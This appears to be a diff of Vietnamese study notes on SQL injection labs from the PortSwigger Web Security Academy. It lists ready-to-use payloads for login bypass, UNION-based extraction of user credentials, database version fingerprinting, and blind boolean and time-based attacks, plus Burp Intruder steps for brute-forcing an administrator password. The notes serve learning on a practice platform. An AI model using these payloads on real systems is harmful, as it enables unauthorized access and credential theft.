@@ -1,27 +1,80 @@
 $Qp*K5g96ip=?@3YgH8+3rc}gD7d-!E5
 APPRENTICE 1: Chuyển category thành "' OR 1=1 --" 
+
 APPRENTICE 2: Đăng nhập với TK và MK là : "administrator'--"
-category='+UNION+SELECT+NULL,NULL,NULL--
-' UNION SELECT NULL,'W0Rwtl',NULL--
 
-'+UNION+SELECT+'asdad','asdasda'--
-'+UNION+SELECT+username,+password+FROM+users--
 
-category=%27union+select+null,null--
-category=%27union+select+null,'a'--
-category=%27union+select+null,concat(username,password)+from+users--
+3: category='+UNION+SELECT+NULL,NULL,NULL-- Thử số phần tử của bảng
+4:' UNION SELECT NULL,'asdf',NULL-- Xác định phần cột thứ 2 có kiểu dữ liệu là text
 
-category=%27union+select+banner,null+from+v$version--
+5: '+UNION+SELECT+'asdad','asdasda'-- Xác định có 2 cột trả về giá trị string
+'+UNION+SELECT+username,+password+FROM+users-- Thực hiện inject lấy dữ liệu
 
-'+UNION+SELECT+@@version,+NULL#
+6: category=%27union+select+null,null-- xác định số cột
+category=%27union+select+null,'a'-- xác định cốt số 2 có type là text
+category=%27union+select+null,concat(username,password)+from+users-- lấy dữ liệu dựa vào hàm concat 
 
-%27union+select+table_name,null+from+information_schema.tables--
+7: category=%27union+select+banner,null+from+v$version-- kiểm tra phiên bản SQL
 
-%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_cjunrn%27--
-%27+UNION+SELECT+password_ppuhns,username_szujqy+FROM+users_cjunrn--
+8:'+UNION+SELECT+@@version,+NULL# kiểm tra phiên bản SQL ở MySQL và Microsoft
 
-'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+9: %27union+select+table_name,null+from+information_schema.tables-- lấy tên các bảng
 
-%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_KWUWTX%27--
+%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_cjunrn%27-- lấy tên các cột trong bảng chứa thông tin users
+%27+UNION+SELECT+password_ppuhns,username_szujqy+FROM+users_cjunrn-- lấy thông tin của users
 
-category=%27+UNION+SELECT+PASSWORD_INJPZA,USERNAME_QCKQOV+FROM+USERS_KWUWTX--
+10: '+UNION+SELECT+table_name,NULL+FROM+all_tables-- lấy thông tin các bảng
+
+%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_KWUWTX%27-- lấy thông tin các cột trong bảng
+
+category=%27+UNION+SELECT+PASSWORD_INJPZA,USERNAME_QCKQOV+FROM+USERS_KWUWTX-- lấy thông tin của các users ở 2 cột username và password
+
+11:'+UNION+SELECT+table_name,NULL+FROM+all_tables-- lấy tên các bảng
+%27+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name=%27USERS_KWUWTX%27-- lấy tên các cột
+
+category=%27+UNION+SELECT+PASSWORD_INJPZA,USERNAME_QCKQOV+FROM+USERS_KWUWTX-- lấy thông tin tài khoản
+
+12: Khi vào trang web, tiến hành thử sql inject cookie trackId bằng cách thêm 'and'1'='1 và 'and'1'='2, ở cái thứ nhất trả về welcome back còn thứ hai không có, nghĩa là có thể inject  cookie này, thực hiện tìm length của password cách thêm vào sau cookie này "'and(select 'a' from users where username='administrator' and length(password)>1)='a".
+Lúc này, ta biết được length của password là 20.
+Tiếp theo, tiến hành bruteforce từng kí tự của password bằng cách gửi req vào intruder và cho vào sau cookie trackID string:
+"' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§c§"
+thêm payload position như trên, phần thứ nhất là số thứ tự của ký tự ở payload option ta chọn number: from 1 to 20
+step 1
+max digit after . = 0
+Phần thứ 2 là ký tự muốn thử, ta làm một list gồm 36 kí tự: 10 chữ số và 26 ký tự trong bảng chữ cái
+(*lưu ý chọn attack-type là clusterbomb)
+phần grep-extract clear list và thêm Welcome back, lúc này start attack.
+Khi BF xong, ta tiến hành sort result theo số lần xuất hiện của string welcome, và sẽ có đúng 20 request có số lần xuất hiện là 1. Các request này chứ 2 payload, là số thứ tự của character trong password và giá trị của nó, tiến hành ghép chúng thành 1 xâu đó chính là password, đăng nhập và hoàn thành bài.
+
+13: Xem solution
+
+14:'||pg_sleep(10)--
+
+15: Kiểm tạo lỗi theo điều kiện:
+'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END--
+'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END--
+Kiểm tra username administrator:
+'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--
+Tiếp theo ta có thể biết được độ dài của password là 20:
+'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(PASSWORD)>19)+THEN+pg_sleep(2)+ELSE+pg_sleep(0)+END+FROM+users--
+Gửi đến Intruder request:
+GET / HTTP/1.1
+Host: 0a00009c04641bc9c0bc2280009c002f.web-security-academy.net
+Cookie: TrackingId=kNAs3843QbVyDbue'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTR(PASSWORD,20,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; session=ElbYiBbrmxOCE18DUfL1Z7aq2luJYtqd
+Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a00009c04641bc9c0bc2280009c002f.web-security-academy.net/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+ta thiết lập list là kí tự tự 0-9, a-z, sau đó ở Resource pool, chọn create new resource pool có maximum concurrent req là 1, chạy từng kí tự của password một đến khi nào thấy request trả về lâu hơn bình thường thì kí tự đó chính là kí tự đúng. Tiến hành làm 20 lần như thế ta thu được passwd của admin.
+
